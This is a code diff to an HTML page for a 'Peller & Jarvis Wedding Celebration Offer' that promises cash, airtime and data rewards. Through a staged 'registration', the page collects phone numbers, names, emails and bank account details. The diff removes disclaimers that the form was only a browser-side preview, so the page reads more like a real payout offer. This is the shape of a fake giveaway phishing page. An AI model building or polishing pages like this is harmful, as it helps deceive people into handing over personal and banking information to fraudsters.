@@ -7,30 +7,26 @@
   <title>Peller & Jarvis Wedding Celebration Offer</title>
   <meta property="og:title" content="Peller & Jarvis Wedding Celebration Offer" />
   <meta property="og:description" content="Register for the Peller and Jarvis wedding celebration reward campaign." />
-  <meta property="og:image" content="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=13" />
+  <meta property="og:image" content="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=14" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/style.css?v=13" />
+  <link rel="stylesheet" href="css/style.css?v=14" />
 </head>
 <body>
   <main class="page-shell">
-    <img class="hero" src="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=13" alt="Peller and Jarvis wedding celebration" />
-    <div class="ticker"><span>PELLER & JARVIS 2026 WEDDING CELEBRATION OFFER</span></div>
-
-    <section class="campaign-strip">
-      <span>CELEBRATION REWARD PACKAGE</span>
-      <strong>₦25,000 Cash + ₦10,000 Airtime + 20GB Data</strong>
-    </section>
+    <img class="hero" src="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=14" alt="Peller and Jarvis wedding celebration" />
+    <div class="ticker"><span>PELLER AND JARVIS 2026 WEDDING CELEBRATION OFFER</span></div>
 
     <section id="intro" class="post step-panel">
-      <div class="powered">POWERED BY: PELLER & JARVIS CELEBRATION</div>
-      <h1>Wedding Celebration Reward Registration</h1>
-      <p class="welcome">Select your mobile network and continue with your registration.</p>
+      <p class="powered">POWERED BY: PELLER & JARVIS</p>
+      <p class="welcome">Celebrate the wedding and register for the available reward package.</p>
 
-      <div class="reward-grid">
-        <div><strong>₦25,000</strong><span>Cash reward</span></div>
+      <div class="reward-banner">
+        <div><strong>₦25,000</strong><span>Cash</span></div>
+        <b>+</b>
         <div><strong>₦10,000</strong><span>Airtime</span></div>
+        <b>+</b>
         <div><strong>20GB</strong><span>Data</span></div>
       </div>
 
@@ -44,30 +40,27 @@
       </select>
       <p id="networkError" class="error hidden">Please select your network.</p>
       <button id="go" class="primary">GET OFFER</button>
-      <small>Applications are reviewed before any cash, airtime or data is approved.</small>
+      <small>Registration is reviewed before approval or delivery.</small>
     </section>
 
     <section id="loader" class="post step-panel hidden center-panel">
       <div class="loader-ring"></div>
-      <h2>Preparing your registration</h2>
-      <p>Please wait while we load the secure application form.</p>
+      <h2>Please wait...</h2>
+      <p>Preparing your registration form.</p>
       <strong id="loaderPercent" class="percent-text">0%</strong>
     </section>
 
     <section id="phoneStep" class="post step-panel hidden">
-      <div class="step-badge">STEP 1 OF 3</div>
+      <div class="step-badge">STEP 1</div>
       <h2>Enter your mobile number</h2>
-      <p>Use the number connected to your selected network.</p>
-      <div class="selected-network"><span>Selected network</span><strong id="selectedNetwork">—</strong></div>
-      <label for="phone">Mobile number</label>
-      <input id="phone" type="tel" inputmode="numeric" maxlength="15" placeholder="08012345678" autocomplete="tel" />
+      <div class="selected-network"><span>Network</span><strong id="selectedNetwork">—</strong></div>
+      <input id="phone" type="tel" inputmode="numeric" maxlength="15" placeholder="Type your number here" autocomplete="tel" />
       <p id="phoneError" class="error hidden">Enter a valid Nigerian mobile number.</p>
       <button id="confirmPhone" class="primary">CONTINUE</button>
     </section>
 
     <section id="checking" class="post step-panel hidden center-panel">
-      <h2>Checking your registration details</h2>
-      <p>Confirming your network and preparing the payout form.</p>
+      <h2>Checking your details...</h2>
       <div class="progress-wrap">
         <div class="progress-track"><i id="verificationFill"></i></div>
         <strong id="verificationPercent">0%</strong>
@@ -76,21 +69,19 @@
     </section>
 
     <section id="detailsStep" class="post step-panel hidden">
-      <div class="step-badge">STEP 2 OF 3</div>
-      <h2>Enter your personal details</h2>
-      <p>These details identify your application and help restore it later.</p>
+      <div class="step-badge">STEP 2</div>
+      <h2>Personal details</h2>
       <label for="fullName">Full name</label>
       <input id="fullName" maxlength="80" autocomplete="name" placeholder="Enter your full name" />
       <label for="email">Email address</label>
       <input id="email" type="email" maxlength="120" autocomplete="email" placeholder="you@example.com" />
       <p id="detailsError" class="error hidden">Enter a valid name and email address.</p>
-      <button id="continueDetails" class="primary">CONTINUE TO ACCOUNT DETAILS</button>
+      <button id="continueDetails" class="primary">CONTINUE</button>
     </section>
 
     <section id="accountStep" class="post step-panel hidden">
-      <div class="step-badge">STEP 3 OF 3</div>
-      <h2>Add your payout account</h2>
-      <p>Use the bank account where an approved ₦25,000 cash reward should be processed.</p>
+      <div class="step-badge">STEP 3</div>
+      <h2>Account details</h2>
       <label for="bankName">Bank name</label>
       <select id="bankName">
         <option value="">Select your bank</option>
@@ -100,37 +91,34 @@
       <input id="accountName" maxlength="100" autocomplete="name" placeholder="Name on the account" />
       <label for="accountNumber">Account number</label>
       <input id="accountNumber" inputmode="numeric" maxlength="10" placeholder="10-digit account number" />
-      <div class="security-note"><strong>Never enter your PIN, OTP, BVN or card details.</strong><span>This preview saves the application only in this browser.</span></div>
+      <div class="security-note"><strong>Never enter PIN, OTP, BVN or card details.</strong></div>
       <p id="accountError" class="error hidden">Enter a bank, account name and valid 10-digit account number.</p>
-      <button id="reviewApplication" class="primary">REVIEW APPLICATION</button>
+      <button id="reviewApplication" class="primary">REVIEW DETAILS</button>
     </section>
 
     <section id="reviewStep" class="post step-panel hidden">
       <div class="step-badge">FINAL REVIEW</div>
-      <h2>Confirm your information</h2>
+      <h2>Confirm your details</h2>
       <div id="reviewDetails" class="review-list"></div>
-      <div class="reward-summary"><span>Application reward package</span><strong>₦25,000 Cash + ₦10,000 Airtime + 20GB Data</strong></div>
-      <label class="consent"><input id="consent" type="checkbox" /><span>I confirm these details belong to me and understand submission does not guarantee approval or delivery.</span></label>
-      <p id="consentError" class="error hidden">Confirm the declaration before submitting.</p>
+      <div class="reward-summary"><span>Reward package</span><strong>₦25,000 Cash + ₦10,000 Airtime + 20GB Data</strong></div>
+      <label class="consent"><input id="consent" type="checkbox" /><span>I confirm these details are mine and understand submission does not guarantee approval.</span></label>
+      <p id="consentError" class="error hidden">Confirm before submitting.</p>
       <button id="submitApplication" class="primary">SUBMIT APPLICATION</button>
       <button id="editApplication" class="secondary">EDIT DETAILS</button>
     </section>
 
     <section id="successStep" class="post step-panel hidden center-panel">
       <div class="success-icon">✓</div>
-      <div class="step-badge">APPLICATION RECEIVED</div>
-      <h2>Thank you, <span id="successName">Supporter</span> 🎉</h2>
-      <p>Your Peller & Jarvis wedding celebration reward application has been saved for review.</p>
-      <div class="status-card"><span>Current status</span><strong>Submitted</strong></div>
-      <div class="reward-grid compact">
-        <div><strong>₦25,000</strong><span>Cash</span></div>
-        <div><strong>₦10,000</strong><span>Airtime</span></div>
-        <div><strong>20GB</strong><span>Data</span></div>
+      <h2>Application received</h2>
+      <p>Thank you, <span id="successName">Supporter</span> 🎉</p>
+      <div class="status-card"><span>Status</span><strong>Submitted</strong></div>
+      <div class="reward-banner compact">
+        <div><strong>₦25,000</strong><span>Cash</span></div><b>+</b><div><strong>₦10,000</strong><span>Airtime</span></div><b>+</b><div><strong>20GB</strong><span>Data</span></div>
       </div>
-      <p class="small-print">No cash, airtime or data has been marked approved or delivered. Production processing requires a secure backend.</p>
-      <button id="startOver" class="secondary">START A NEW APPLICATION</button>
+      <small>No reward has been marked approved or delivered.</small>
+      <button id="startOver" class="secondary">START AGAIN</button>
     </section>
   </main>
-  <script src="js/app.js?v=13"></script>
+  <script src="js/app.js?v=14"></script>
 </body>
 </html>
